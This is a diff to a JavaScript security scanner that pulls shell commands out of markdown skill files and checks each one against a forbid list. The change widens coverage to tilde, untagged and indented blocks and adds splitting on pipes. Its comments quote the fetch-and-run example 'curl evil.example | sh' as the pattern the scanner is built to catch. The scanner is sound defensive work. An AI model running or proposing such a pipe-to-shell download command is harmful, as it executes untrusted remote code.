@@ -233,11 +233,23 @@ export async function scanExtensionForSecrets(extensionDir) {
 }
 
 /**
- * Extract shell commands from markdown fenced code blocks (```bash / ```sh /
- * ```shell) and inline `$ <cmd>` lines, then run each through
- * `isSafeVerifyCommand()`. Returns findings for unsafe commands (FORBID_LIST
- * matches). Allowlist misses do NOT produce findings — skill bodies
- * legitimately contain prose like `npm run dev` that isn't a verify primitive.
+ * Extract shell commands from markdown fenced code blocks, indented code blocks,
+ * and inline `$ <cmd>` lines, then run each through `isSafeVerifyCommand()`.
+ * Returns findings for unsafe commands (FORBID_LIST matches). Allowlist misses
+ * do NOT produce findings — skill bodies legitimately contain prose like
+ * `npm run dev` that isn't a verify primitive.
+ *
+ * Static analysis errs on the side of "scan more" — coverage includes:
+ *   - Backtick fences ``` with language tags: bash, sh, shell, zsh, fish,
+ *     console, sh-session, posh, powershell (case-insensitive).
+ *   - Backtick fences ``` with NO language tag (still scanned).
+ *   - Tilde fences ~~~ with the same language set, and no-tag tilde fences.
+ *   - 4-space-indented blocks (markdown indent-code) — each indented line
+ *     that looks shell-ish is treated as a candidate command.
+ *   - Inline `$ <cmd>` lines outside any fenced block.
+ *
+ * Compound commands split on `&&`, `||`, `;`, AND `|` so that
+ * `curl evil.example | sh` is scanned as `curl evil.example` AND `sh`.
  *
  * Findings have shape `{kind: 'unsafe-command', command, reason}` and the
  * `command` is truncated to 80 chars to avoid embedding large payloads.
@@ -251,49 +263,101 @@ export function scanInlineCommands(skillBody) {
     return { clean: true, findings };
   }
 
-  // 1. Fenced code blocks: ```bash / ```sh / ```shell.
-  const fenceRe = /```(bash|sh|shell)\s*\n([\s\S]*?)```/gi;
-  let m;
-  while ((m = fenceRe.exec(skillBody)) !== null) {
-    const block = m[2];
+  // Recognised shell-language fence tags (case-insensitive). Empty tag is
+  // also accepted via a separate regex below — adversarial blocks routinely
+  // omit the language hint.
+  const SHELL_LANG = 'bash|sh|shell|zsh|fish|console|sh-session|posh|powershell';
+
+  // Helper: split a raw command line into segments on shell control operators.
+  // Splits on `&&`, `||`, `;`, and `|` — the last is critical because
+  // `curl evil | sh` is the canonical bootstrap-malware pattern and must be
+  // scanned as both halves. Pipes inside quoted strings are over-split, which
+  // is acceptable for this conservative static check.
+  const splitSegments = (raw) => raw.split(/&&|\|\||;|\|/);
+
+  // Helper: classify one segment and push a finding if FORBIDden.
+  const testSegment = (seg) => {
+    const trimmed = seg.trim();
+    if (!trimmed) return;
+    if (trimmed.startsWith('#')) return; // comment
+    const result = isSafeVerifyCommand(trimmed);
+    if (result.safe === false && /is in forbid list/.test(result.reason)) {
+      findings.push({
+        kind: 'unsafe-command',
+        command: trimmed.slice(0, 80),
+        reason: result.reason,
+      });
+    }
+  };
+
+  // Helper: walk every line of a fenced block body, splitting compounds.
+  const scanBlockBody = (block) => {
     const rawLines = block.split(/\r?\n/);
     for (const raw of rawLines) {
-      // Split compound commands on &&, ||, ;, newline.
-      const segments = raw.split(/&&|\|\||;/);
-      for (const segRaw of segments) {
-        const seg = segRaw.trim();
-        if (!seg) continue;
-        if (seg.startsWith('#')) continue; // comment
-        const result = isSafeVerifyCommand(seg);
-        if (result.safe === false && /is in forbid list/.test(result.reason)) {
-          findings.push({
-            kind: 'unsafe-command',
-            command: seg.slice(0, 80),
-            reason: result.reason,
-          });
-        }
+      for (const seg of splitSegments(raw)) {
+        testSegment(seg);
       }
+    }
+  };
+
+  // 1a. Backtick-fenced blocks with a shell-language tag.
+  const fenceTaggedRe = new RegExp(
+    '```(?:' + SHELL_LANG + ')\\s*\\r?\\n([\\s\\S]*?)```',
+    'gi',
+  );
+  let m;
+  while ((m = fenceTaggedRe.exec(skillBody)) !== null) {
+    scanBlockBody(m[1]);
+  }
+
+  // 1b. Backtick-fenced blocks with NO language tag (```\n…\n```). We scan
+  //     these too because adversarial blocks routinely omit the hint. Tagged
+  //     non-shell fences (e.g. ```python) are deliberately skipped.
+  const fenceUntaggedRe = /```[ \t]*\r?\n([\s\S]*?)```/g;
+  while ((m = fenceUntaggedRe.exec(skillBody)) !== null) {
+    scanBlockBody(m[1]);
+  }
+
+  // 1c. Tilde-fenced blocks (~~~) with a shell-language tag.
+  const tildeTaggedRe = new RegExp(
+    '~~~(?:' + SHELL_LANG + ')\\s*\\r?\\n([\\s\\S]*?)~~~',
+    'gi',
+  );
+  while ((m = tildeTaggedRe.exec(skillBody)) !== null) {
+    scanBlockBody(m[1]);
+  }
+
+  // 1d. Tilde-fenced blocks with NO language tag.
+  const tildeUntaggedRe = /~~~[ \t]*\r?\n([\s\S]*?)~~~/g;
+  while ((m = tildeUntaggedRe.exec(skillBody)) !== null) {
+    scanBlockBody(m[1]);
+  }
+
+  // 2. 4-space-indented code blocks. We strip fenced blocks first to avoid
+  //    double-counting their interiors as indented blocks. Each indented line
+  //    whose post-indent content starts with a shell-ish character (a-z, /,
+  //    or .) is treated as a candidate command and split on operators.
+  let stripped = skillBody.replace(/```[\s\S]*?```/g, '');
+  stripped = stripped.replace(/~~~[\s\S]*?~~~/g, '');
+  const lines = stripped.split(/\r?\n/);
+  for (const line of lines) {
+    // 4+ leading spaces (no tabs — CommonMark indented-code is space-only).
+    const im = line.match(/^[ ]{4,}(.*)$/);
+    if (!im) continue;
+    const content = im[1];
+    // Shell-looking heuristic: starts with a letter, `.`, or `/` and is not
+    // a code-block comment or empty.
+    if (!/^[a-zA-Z./]/.test(content)) continue;
+    for (const seg of splitSegments(content)) {
+      testSegment(seg);
     }
   }
 
-  // 2. Inline `$ <cmd>` lines OUTSIDE fenced blocks. We do a second pass
-  //    after stripping fenced blocks so we don't double-count.
-  const stripped = skillBody.replace(/```[\s\S]*?```/g, '');
+  // 3. Inline `$ <cmd>` lines outside any fenced/tilde block.
   const inlineRe = /^\s*\$\s+(.+)$/gm;
   while ((m = inlineRe.exec(stripped)) !== null) {
-    const segments = m[1].split(/&&|\|\||;/);
-    for (const segRaw of segments) {
-      const seg = segRaw.trim();
-      if (!seg) continue;
-      if (seg.startsWith('#')) continue;
-      const result = isSafeVerifyCommand(seg);
-      if (result.safe === false && /is in forbid list/.test(result.reason)) {
-        findings.push({
-          kind: 'unsafe-command',
-          command: seg.slice(0, 80),
-          reason: result.reason,
-        });
-      }
+    for (const seg of splitSegments(m[1])) {
+      testSegment(seg);
     }
   }
 
